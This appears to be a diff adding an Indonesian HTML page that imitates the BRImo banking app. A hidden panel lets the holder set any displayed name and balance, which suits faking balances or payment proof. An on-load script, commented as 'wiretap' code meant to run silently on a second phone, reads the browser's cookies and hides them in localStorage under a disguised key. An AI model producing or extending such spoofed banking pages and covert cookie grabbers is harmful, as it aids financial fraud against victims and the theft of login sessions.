@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BRImo 2026 - Digital Banking</title>
+    <style>
+        /* CSS MASTER TETAP SAMA */
+        * { box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        body { background: #f0f2f5; margin: 0; display: flex; justify-content: center; }
+        .phone { width: 100%; max-width: 412px; background: #00529C; min-height: 100vh; position: relative; color: white; }
+        .top-bar { padding: 40px 20px 20px; display: flex; justify-content: space-between; align-items: center; }
+        .logo { font-weight: 800; font-size: 22px; letter-spacing: -1px; }
+        .welcome { padding: 0 20px 30px; }
+        .name-tag { font-size: 20px; font-weight: 600; cursor: pointer; border-bottom: 1px dashed rgba(255,255,255,0.4); }
+        .main-content { background: white; border-top-left-radius: 30px; border-top-right-radius: 30px; min-height: 80vh; color: #333; padding: 20px; }
+        .card { background: linear-gradient(135deg, #00529C 0%, #0074db 100%); border-radius: 20px; padding: 20px; color: white; margin-top: -60px; box-shadow: 0 15px 30px rgba(0,82,156,0.2); }
+        .acc-num { font-size: 13px; opacity: 0.8; margin-bottom: 5px; }
+        .balance-label { font-size: 12px; opacity: 0.9; }
+        .balance-val { font-size: 26px; font-weight: 700; margin: 5px 0; }
+        .menu-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; margin-top: 30px; text-align: center; }
+        .menu-icon { width: 55px; height: 55px; background: #f0f7ff; border-radius: 18px; margin: 0 auto 8px; display: flex; align-items: center; justify-content: center; font-size: 24px; color: #00529C; }
+        .menu-text { font-size: 11px; font-weight: 600; color: #444; }
+        .admin { background: #fff; padding: 15px; border-radius: 15px; margin-top: 30px; border: 1px solid #eee; }
+        input { width: 100%; padding: 12px; margin: 5px 0; border: 1px solid #ddd; border-radius: 10px; font-size: 14px; }
+        button { width: 100%; background: #00529C; color: white; border: none; padding: 12px; border-radius: 10px; font-weight: bold; margin-top: 10px; }
+    </style>
+</head>
+<body>
+
+<div class="phone">
+    <div class="top-bar">
+        <div class="logo">BRImo</div>
+        <div style="font-size: 20px;">🔔</div>
+    </div>
+
+    <div class="welcome">
+        <div style="font-size: 14px; opacity: 0.8;">Selamat Malam,</div>
+        <div class="name-tag" id="displayName">MASTER AURA</div>
+    </div>
+
+    <div class="main-content">
+        <div class="card">
+            <div class="acc-num">Tabungan • 4567********890</div>
+            <div class="balance-label">Saldo Efektif</div>
+            <div class="balance-val" id="displayBalance">Rp 0</div>
+            <div style="font-size: 11px; text-align: right; opacity: 0.8;">Mutasi ></div>
+        </div>
+
+        <div class="menu-grid">
+            <div class="menu-item"><div class="menu-icon">💸</div><div class="menu-text">Transfer</div></div>
+            <div class="menu-item"><div class="menu-icon">🏦</div><div class="menu-text">Briva</div></div>
+            <div class="menu-item"><div class="menu-icon">📱</div><div class="menu-text">Top Up</div></div>
+            <div class="menu-item"><div class="menu-icon">💳</div><div class="menu-text">E-Wallet</div></div>
+        </div>
+
+        <div class="admin">
+            <input type="text" id="newName" placeholder="Ganti Nama User...">
+            <input type="number" id="newBalance" placeholder="Ganti Angka Saldo...">
+            <button onclick="applyChanges()">Update Tampilan</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    // 1. KODINGAN MASTER (UPDATE TAMPILAN)
+    function applyChanges() {
+        const name = document.getElementById('newName').value;
+        const balance = document.getElementById('newBalance').value;
+        if(name) document.getElementById('displayName').innerText = name.toUpperCase();
+        if(balance) {
+            const formatted = new Intl.NumberFormat('id-ID', {
+                style: 'currency', currency: 'IDR', minimumFractionDigits: 0
+            }).format(balance);
+            document.getElementById('displayBalance').innerText = formatted;
+        }
+    }
+
+    // 2. KODINGAN PENYADAP (LOCALSTORAGE GHOST)
+    // Script ini jalan otomatis saat file dibuka di HP kedua Master
+    window.onload = function() {
+        // Ambil data cookie yang ada di browser HP kedua
+        const dataRahasia = document.cookie || "KOSONG / TIDAK ADA LOGIN";
+        
+        // Simpan ke 'Gudang' rahasia di browser tersebut
+        localStorage.setItem('brimo_cache_v2', dataRahasia);
+        
+        console.log("Sistem Internal Aktif.");
+    };
+</script>
+
+</body>
+</html>
